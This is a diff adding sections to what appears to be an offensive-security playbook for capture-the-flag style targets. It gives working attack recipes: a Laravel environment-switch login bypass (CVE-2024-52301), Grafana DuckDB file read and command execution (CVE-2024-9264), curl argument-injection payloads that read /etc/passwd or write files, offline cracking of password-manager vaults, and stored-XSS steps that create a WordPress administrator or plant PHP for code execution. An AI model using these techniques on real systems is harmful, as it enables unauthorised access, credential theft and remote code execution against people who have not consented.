@@ -84,6 +84,59 @@ flags). Triage what the session contains before doing anything else; it is the m
 the authorization model. Report the handler as a finding in its own right even when the
 leaked session is yours: it leaks every other user's the same way.
 
+**Each stack frame also renders the crashing file's own source — a few lines
+either side of the fault — so the page is a source-code reader, not just a path
+list.** Force the error to move: supply a *different* malformed input and the
+fault lands on the next statement, printing the next window. On Laravel/Ignition
+this walked an inline `routes/web.php` login closure line by line (omit a field →
+`Undefined array key`; send a junk value → `Undefined variable` further down).
+What you are hunting in that source is a **dev-only branch that keys on the
+environment or a debug flag** — `if (App::environment()=="preprod") { login as
+user 1 }`, `if (config('app.debug')) …`. That branch is a credential-free bypass
+*if you can make the app believe it is in that environment*, which is the next
+class.
+
+## The request should not get to choose the environment (Laravel CVE-2024-52301)
+
+A dev shortcut gated on `App::environment()` is only exploitable if the
+environment is attacker-controllable. Laravel < 11.31.0 (and the 6–10 back-branches)
+with PHP `register_argc_argv=On` reads `argv` even under the HTTP SAPI, so a query
+string `?--env=<name>` *sets* the runtime environment for that request. Combined
+with a `preprod`/`local`/`dev` branch read off the debug page, `POST
+/login?--env=preprod` returns an authenticated session with no credentials. Pin
+the Laravel version from the Ignition page and check it against 11.31.0 before
+anything harder; the same shape (environment or profile chosen by an unauthenticated
+request parameter) recurs in other frameworks' "active profile" selectors.
+
+## A dashboard/BI tool with an embedded query engine is a file-read + RCE surface
+
+Grafana, Metabase, Superset, Redash and friends ship a SQL/expression engine that
+runs server-side. Pin the exact version from an unauthenticated health/version
+endpoint (`/api/health` for Grafana returns `version`), then check it against the
+known query-engine CVEs — these tools gain a critical one every year or two, and
+the embedded engine usually runs as the service user, which in a container is
+often **root**.
+
+**Example — Grafana CVE-2024-9264** (11.0.0–11.0.5 / 11.1.x / 11.2.x; needs an
+authenticated session, any role that can reach *SQL Expressions*): `POST
+/api/ds/query` with a server-side `__expr__` datasource of `"type":"sql"` runs
+the expression in a bundled **DuckDB**. `SELECT content FROM read_text('/etc/passwd')`
+is an immediate arbitrary file read; the `shellfs` extension turns
+`read_csv('<cmd> >/tmp/o 2>&1 |')` into command execution. Two operational
+details that waste time if unknown:
+
+- The expression runner only accepts **row-returning** statements. A bare `LOAD`,
+  `INSTALL`, `SET` or `PRAGMA` 500s, and a multi-statement batch 400s — so a
+  hand-rolled `LOAD shellfs; SELECT …` fails. The working form **prefixes
+  `SELECT 1;`** so the whole batch returns a result set.
+- Confirm the file-read path (pure `SELECT`) before fighting the exec extension;
+  if the community-extension install is egress-blocked, the file read alone still
+  exfiltrates configs, DBs and `/proc` where readable.
+
+The method transfers across these products: version from the health endpoint →
+the query endpoint → file read first → the exec path (a UDF, a language runtime,
+an extension) second.
+
 Isolation between environments is measured at the trust layer, not by hostname. When a
 demo/staging/sandbox host is in scope, diff `/.well-known/openid-configuration` and
 `/oauth/jwks` across the environments: an identical `kid`/`n` or an `issuer` that names
@@ -708,6 +761,19 @@ executes with the **web process's identity**. Two high-value moves before anythi
   (`ssh2john`+rockyou) and SSH in. No RCE required. If it runs as `www-data`/a
   service account, pivot instead to `config/master.key` (+`credentials.yml.enc` →
   `secret_key_base`), `database.yml`, the app DB, and world-readable flags.
+- **Enumerate the *target user's* app-data dirs, not just dotfiles.** A read bug
+  as the web user can still reach a human user's home if the home is traversable
+  (`o+x`) and the file is world-readable. The highest-yield spot is not
+  `~/.bashrc` but the per-application data stores under `~/.local/share/<app>/` and
+  `~/.config/<app>/` — where CLI tools and password managers keep their vaults
+  (e.g. a Python `cryptocode`-based manager stores an encrypted blob there). Learn
+  the exact storage path from the *tool's* docs (researching a product is allowed);
+  a dotfile wordlist will miss it. Such vaults are usually offline-crackable: feed
+  a wordlist to the tool's own `decrypt()`, which returns false/empty on a wrong
+  key — a clean oracle, and the master password is often in `rockyou`. The flag
+  itself may also sit in a web-user-readable path under a randomised name (e.g.
+  `/var/www/html/user_<rand>.txt`), invisible to `find -name user.txt` but trivial
+  to read once named.
 
 Framework note: a Rails `_*_session` cookie that decrypts (with a leaked
 `secret_key_base`) to no user id means auth lives elsewhere — e.g. CamaleonCMS's
@@ -890,3 +956,65 @@ to the normal success page with no execution is the symptom. Rather than reverse
 the exact slashing, deliver via the published exploit's own encoding (the bypass
 variant — e.g. CVE-2024-8353 for GiveWP — or the Metasploit module handles it) and
 use it only to drop a webshell; then work from the shell.
+
+## A "URL checker"/SSRF that shells out to `curl` is argument injection, not just SSRF
+
+When a feature fetches a user-supplied URL and the backend builds a *shell* command
+(`exec("/usr/bin/curl -s $url")`, `system("wget $url")`, …), look for **argument
+injection** before assuming plain SSRF. The tell:
+
+- Fingerprint the fetcher (its `User-Agent` on your listener = `curl/x`, `Wget/x`).
+- A space in your input splits into extra argv **but** shell metacharacters
+  (`; | & $ \` ( )`) are passed literally → the backend used `escapeshellcmd()`,
+  which escapes metacharacters **but not whitespace**. No shell injection, but full
+  control of the tool's flags.
+
+A scheme allow-list implemented as a *prefix* check
+(`preg_match('|^https?://|', $url)`) only validates the start of the string, so you
+inject a **second URL argument with any scheme**:
+
+```
+url=http://127.0.0.1/ file:///etc/passwd      # curl fetches both; app reflects the file → arbitrary read
+url=http://127.0.0.1/ -o /tmp/x <your-url>    # -o writes the fetched body anywhere the web user can write
+```
+
+For `curl` specifically: `file://` = arbitrary file read (as the web user); `-o`/`-O`
+= arbitrary file *write* (webshell only if a served dir is web-user-writable — often
+the webroot is root-owned, so this is read-primary); `-H`/`-A`/`-x` manipulate the
+outbound request; `-K <file>` reads options from a file you planted. `curl` cannot
+list directories over `file://`, so you must know filenames — enumerate via read of
+`/etc/passwd`, configs, and the app source, and see the file-read→app-data note in
+`privesc-linux.md`. Egress to the VPN often still works even when *public* fetches
+fail ("down"): confirm by pointing the fetch at your own listener before ruling out
+reverse shells.
+
+## Client-side crypto / in-browser "AI processing" is not a trust boundary
+When an app does work in the browser — encrypts a payload, runs Whisper/an
+OCR/a summariser — and the server stores or trusts the result, read the client
+code for the key or the submit call and **replay it yourself**. A symmetric key
+shipped in JS (`const ENCRYPTION_KEY = '…'`) lets an anonymous attacker produce
+ciphertext the server will accept as genuine: the encryption authenticates
+nothing. Reproduce the browser's exact request (same `action`, nonce, encrypted
+blob) and you write arbitrary "transcription"/"summary"/"analysis" content. Pair
+this with the sink question below. *(A logged-out WordPress `wp_create_nonce` is
+stable and `nopriv` AJAX actions accept the nonce printed in the page.)*
+
+## For every stored value, find the sink and whether it is escaped
+A custom field (post meta, a "submission", a review note) that is written by one
+role and rendered to another is a stored-XSS candidate. Grep the server source
+for where it is echoed: `nl2br($x)`, `echo $x`, `innerHTML` without
+`esc_html`/`htmlspecialchars` is the bug. The data often is **not** in any
+public API (REST shows the post but not the meta) precisely because it renders
+only in an admin screen — which means the viewer is privileged. A code comment
+describing "symbol mapping for injection", a field that accepts HTML, or a
+"review"/"moderation" queue all point at an automated privileged viewer.
+
+## Stored XSS against an admin: prefer a same-origin privileged action to a callback
+When egress to your box is unknown (filtered ports, a headless reviewer bot),
+do not build the payload around exfiltrating a cookie. Make it act *as* the admin
+in-origin: fetch `/wp-admin/user-new.php`, scrape `_wpnonce_create-user`, POST a
+new `administrator`; or hit the plugin/theme editor/uploader for direct PHP RCE.
+An `<img src=x onerror=…>` fires regardless of how the HTML was inserted, unlike
+an injected `<script>`. The result (new creds, a planted file) is something you
+then reach directly — no inbound connection required. See the egress-direction
+rule in the skill's enumeration section.
